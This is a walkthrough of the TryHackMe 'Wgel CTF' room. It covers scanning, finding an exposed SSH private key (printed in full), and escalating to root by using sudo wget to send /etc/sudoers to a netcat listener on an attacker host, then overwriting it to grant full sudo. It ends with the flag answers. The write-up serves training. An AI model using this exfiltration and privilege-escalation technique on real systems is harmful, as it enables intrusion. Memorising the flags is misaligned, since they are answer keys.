###### Can you exfiltrate the root flag?
Room: https://tryhackme.com/room/wgelctf
##

**sudo** nmap -sS -sV xx.xx.xxx.xx
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The webpage's source code gives us a potentially username for the SSH service.
```
 <!-- Jessie don't forget to udate the webiste -->
```

**gobuster** dir -u http://xx.xx.xxx.xx -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100
```
/sitemap              (Status: 301) [Size: 314] [--> http://xx.xx.xxx.xx/sitemap/]
```

On the other hand, the sitemap directory wasn't very helpful. However, I decided to fuzz the directory more.  

**ffuf** -u http://xx.xx.xxx.xx/FUZZ -w /usr/share/wordlists/dirb/common.txt --recursion   

There is a hidden **.ssh** directory that contains a **rsa** private key.
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```


By saving this to our machine, see that we can authenticate to the SSH service under the jessie user.   

**ssh** -i privatekey jessie@xx.xx.xxx.xx  

We do have acces to the wget command as sudo.  
This means we can use the command to send or get files from another servers.

We can send the content of the **/etc/sudoers** file to our attacking machine, edit the file and get the modified file on the target system.  
For this, we need to set up a netcat listener on our attacking machine.

**sudo wget** --post-file=/etc/sudoers attackerMachineIP:1234 http://attackerMachineIP:1234/  

On the netcat listener, we get the content of the file.  

```
listening on [any] 1234 ...
connect to [xx.x.x.xx] from (UNKNOWN) [xx.xx.xxx.xx] 58384
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: xx.x.x.xx:1234
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 797

#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
jessie	ALL=(root) NOPASSWD: /usr/bin/wget
```

What we need now is to save the content under the name **sudoers** and change the line 
```
jessie	ALL=(root) NOPASSWD: /usr/bin/wget
```

TO

```
jessie  ALL=(root) NOPASSWD: ALL
```

We also need to remove this part.  
```
listening on [any] 1234 ...
connect to [xx.x.x.xx] from (UNKNOWN) [xx.xx.xxx.xx] 58384
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: xx.x.x.xx:1234
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 797
```


After the file is edited, we can use **wget** on the target machine to retrieve it from our attacking machine.  

[Attacker Machine]  
**python3** -m http.server

[Target Machine]  
**cd** /etc/
**sudo wget** attackerMachineIP:8000/sudoers --output-document=sudoers

**sudo -l**
```
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: ALL
```

The **sudo su** command gives us root access. 

The **user** flag is at /home/jessie/Documents/user_flag.txt and is **057c67131c3d5e42dd5cd3075b198ff6**.  
The **root** flag is at /root/root_flag.txt and is **b1b968b37519ad1daa6408188649263d**.  
